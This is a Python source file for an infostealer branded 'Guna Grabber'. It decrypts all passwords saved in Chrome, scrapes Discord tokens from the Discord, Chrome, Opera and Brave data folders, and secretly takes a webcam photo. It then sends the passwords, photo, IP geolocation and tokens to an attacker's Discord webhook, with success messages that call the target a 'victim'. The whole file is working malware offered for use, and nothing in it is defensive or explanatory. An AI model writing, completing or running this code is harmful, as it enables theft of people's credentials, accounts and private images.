import os
import json
import base64
import sqlite3
import colorama
from Cryptodome.Cipher import AES
import shutil
import platform
import requests
import subprocess
import sys
import zipfile
import cv2
import win32crypt
from datetime import datetime
from colorama import Fore, Style
from re import findall
from urllib.request import Request, urlopen

colorama.init(autoreset=True)

# Discord Webhook HERE
WEBHOOK_URL = ""

# List of required packages
required_packages = ['pycryptodome', 'requests', 'colorama', 'pywin32', 'opencv-python']

def install_packages():
    """Install required packages if they are not already installed."""
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(Fore.YELLOW + f"Installing {package}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

def get_chrome_local_state_path():
    """Get the path to Chrome's Local State file based on the operating system."""
    system_paths = {
        'Windows': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State'),
        'Darwin': os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State'),
        'Linux': os.path.expanduser('~/.config/google-chrome/Local State')
    }
    system = platform.system()
    return system_paths.get(system, None)

def get_secret_key():
    """Retrieve the secret key used for decrypting Chrome passwords."""
    try:
        chrome_local_state = get_chrome_local_state_path()
        if not chrome_local_state:
            raise FileNotFoundError("Local State file not found.")

        with open(chrome_local_state, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
            encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')

            if encrypted_key:
                encrypted_key = base64.b64decode(encrypted_key.encode('utf-8'))[5:]
                secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return secret_key
            else:
                raise ValueError("Chrome secret key not found in the local state file.")
    except Exception as e:
        print(Fore.RED + "[ERR] Cannot retrieve secret key:", str(e) + Style.RESET_ALL)
        return None

def generate_cipher(aes_key, iv):
    """Generate a new AES cipher object."""
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    """Decrypt the password using the provided secret key."""
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, iv)
        decrypted_pass = cipher.decrypt(encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        print(Fore.RED + "[ERR] Unable to decrypt password:", str(e) + Style.RESET_ALL)
        return ""

def get_db_connection(chrome_path_login_db):
    """Establish a connection to the Chrome login database."""
    try:
        temp_login_db = "chrome_passwords.db"
        shutil.copy2(chrome_path_login_db, temp_login_db)
        return sqlite3.connect(temp_login_db)
    except Exception as e:
        print(Fore.RED + "[Error] Unable to connect to Chrome database:", str(e) + Style.RESET_ALL)
        return None

def get_chrome_path_login_db():
    """Get the path to Chrome's Login Data database based on the operating system."""
    system_paths = {
        'Windows': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        'Darwin': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'),
        'Linux': os.path.expanduser('~/.config/google-chrome/Default/Login Data')
    }
    system = platform.system()
    chrome_path_login_db = system_paths.get(system)

    if chrome_path_login_db and os.path.isfile(chrome_path_login_db):
        return chrome_path_login_db
    else:
        print(Fore.RED + "[Error] Chrome Login Data file not found or unsupported operating system." + Style.RESET_ALL)
        return None

def get_ip_geolocation():
    """Retrieve the IP address and geolocation information."""
    try:
        response = requests.get('http://ipinfo.io')
        data = response.json()
        ip = data.get('ip')
        city = data.get('city')
        region = data.get('region')
        country = data.get('country')
        return f"IP: {ip}\nLocation: {city}, {region}, {country}"
    except Exception as e:
        print(Fore.RED + "[ERR] Unable to retrieve IP geolocation:", str(e) + Style.RESET_ALL)
        return "Unavailable"

def take_webcam_picture():
    """Take a picture using the webcam and save it as a file."""
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            webcam_path = os.path.join(os.path.expanduser("~"), "webcam.png")
            cv2.imwrite(webcam_path, frame)
            cap.release()
            return webcam_path
        else:
            cap.release()
            raise RuntimeError("Failed to capture image from webcam.")
    except Exception as e:
        print(Fore.RED + f"[ERR] Unable to take webcam picture: {str(e)}")
        return None

def zip_files(username, files):
    """Create a zip file containing the specified files."""
    zip_filename = f"{username}-guna.zip"
    try:
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for file in files:
                if file and os.path.isfile(file):
                    zipf.write(file, os.path.basename(file))
        return zip_filename
    except Exception as e:
        print(Fore.RED + f"[ERR] Unable to create zip file: {str(e)}")
        return None

def send_zip_to_webhook(zip_filename):
    """Send the zip file to the Discord webhook."""
    try:
        with open(zip_filename, 'rb') as f:
            files = {'file': (zip_filename, f)}
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 204:
                print(Fore.GREEN + "Zip file sent successfully.")
            else:
                print(Fore.RED + f"Failed to send zip file. Status code: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"[ERR] Error sending zip file: {str(e)}")

def send_ip_embed_to_webhook(ip_info):
    """Send the IP information as an embed to the Discord webhook."""
    embed = {
        "title": "New IP Information Retrieved",
        "description": f"**Geolocation:**\n{ip_info}",
        "color": 10181046,  # Purple color
        "footer": {
            "text": "-# https://github.com/GunaGrab"
        },
        "thumbnail": {
            "url": "https://avatars.githubusercontent.com/u/184970329?v=4"  # Same as pfp
        }
    }
    payload = {
        "username": "Guna Grabber",
        "avatar_url": "https://avatars.githubusercontent.com/u/184970329?v=4",
        "embeds": [embed]
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print(Fore.GREEN + "IP information sent successfully.")
        else:
            print(Fore.RED + f"Failed to send IP information. Status code: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"[ERR] Error sending IP information to webhook: {str(e)}")

def send_success_embed():
    """Send an embed indicating whether passwords were grabbed successfully."""
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    passwords_grabbed = "Yes" if os.path.exists("passwords.txt") else "No"
    
    embed = {
        "title": "Guna Victim Grabbed Successfully",
        "description": f"**Time:** {current_time}\n**Passwords Grabbed:** {passwords_grabbed}",
        "color": 10181046,  # Purple color
        "footer": {
            "text": " -# https://github.com/GunaGrab "
        },
        "thumbnail": {
            "url": "https://avatars.githubusercontent.com/u/184970329?v=4"  # Same as pfp
        }
    }
    
    payload = {
        "username": "Guna Grabber",
        "avatar_url": "https://avatars.githubusercontent.com/u/184970329?v=4",
        "embeds": [embed]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print(Fore.GREEN + "Success embed sent successfully.")
        else:
            print(Fore.RED + f"Failed to send success embed. Status code: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"[ERR] Error sending success embed: {str(e)}")

def get_tokens():
    """Retrieve Discord tokens from various applications."""
    paths = {
        "Discord": os.path.join(os.getenv("APPDATA"), "Discord"),
        "Discord Canary": os.path.join(os.getenv("APPDATA"), "discordcanary"),
        "Discord PTB": os.path.join(os.getenv("APPDATA"), "discordptb"),
        "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default")
    }

    tokens = []
    for app, path in paths.items():
        if os.path.exists(path):
            token_path = os.path.join(path, "Local Storage", "leveldb")
            if os.path.exists(token_path):
                for file_name in os.listdir(token_path):
                    if file_name.endswith('.log') or file_name.endswith('.ldb'):
                        with open(os.path.join(token_path, file_name), 'r', errors='ignore') as f:
                            for line in f:
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    tokens += findall(regex, line)
    
    return tokens

def get_user_data(token):
    """Retrieve user data from Discord API using the token."""
    try:
        response = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": token})
        if response.status_code == 200:
            return response.json()
        else:
            return None
    except Exception as e:
        print(Fore.RED + f"[ERR] Unable to retrieve user data: {str(e)}")
        return None

def send_token_embed(token, user_data):
    """Send the token information as an embed to the Discord webhook."""
    username = f"{user_data['username']}#{user_data['discriminator']}"
    user_id = user_data['id']
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data['avatar']}"

    embed = {
        "color": 0x7289da,
        "fields": [
            {
                "name": "**Token**",
                "value": token,
                "inline": False
            },
            {
                "name": "**Account Info**",
                "value": f'Username: {username}\nUser ID: {user_id}',
                "inline": True
            }
        ],
        "footer": {
            "text": "Token Grabber By Guna"
        },
        "thumbnail": {
            "url": avatar_url
        }
    }

    payload = {
        "username": "Discord Token Grabber",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
        "embeds": [embed]
    }

    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print(Fore.GREEN + "Token embed sent successfully.")
        else:
            print(Fore.RED + f"Failed to send token embed. Status code: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"[ERR] Error sending token embed: {str(e)}")

def decrypt_chrome_passwords():
    """Decrypt Chrome passwords, save them to a text file, and send them to the webhook."""
    secret_key = get_secret_key()
    chrome_path_login_db = get_chrome_path_login_db()

    if secret_key and chrome_path_login_db:
        with get_db_connection(chrome_path_login_db) as conn:
            if conn is None:
                return  # Exit if the connection could not be established
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()

        if rows:
            password_file_path = os.path.join(os.path.expanduser("~"), "passwords.txt")
            with open(password_file_path, 'w', encoding='utf-8') as password_file:
                for index, login in enumerate(rows):
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        password_file.write(f"Sequence: {index}\n")
                        password_file.write(f"URL: {url}\n")
                        password_file.write(f"Username: {username}\n")
                        password_file.write(f"Password: {decrypted_password}\n")
                        password_file.write("+-" * 25 + "\n")

            # Take a webcam picture
            webcam_picture_path = take_webcam_picture()
            
            # Create a zip file with the passwords and webcam picture
            username = os.getlogin()
            zip_filename = zip_files(username, [password_file_path, webcam_picture_path])

            if zip_filename:
                # Send the zip file to the webhook
                send_zip_to_webhook(zip_filename)

                # Get IP geolocation and send it as an embed
                ip_info = get_ip_geolocation()
                send_ip_embed_to_webhook(ip_info)

                # Send success embed indicating whether passwords were grabbed
                send_success_embed()
        else:
            print(Fore.YELLOW + "No passwords found in the database.")
            send_success_embed()  # Indicate that no passwords were grabbed

    # Grab Discord tokens
    tokens = get_tokens()
    if tokens:
        for token in tokens:
            user_data = get_user_data(token)
            if user_data:
                send_token_embed(token, user_data)

if __name__ == '__main__':
    install_packages()  # Install required packages
    decrypt_chrome_passwords()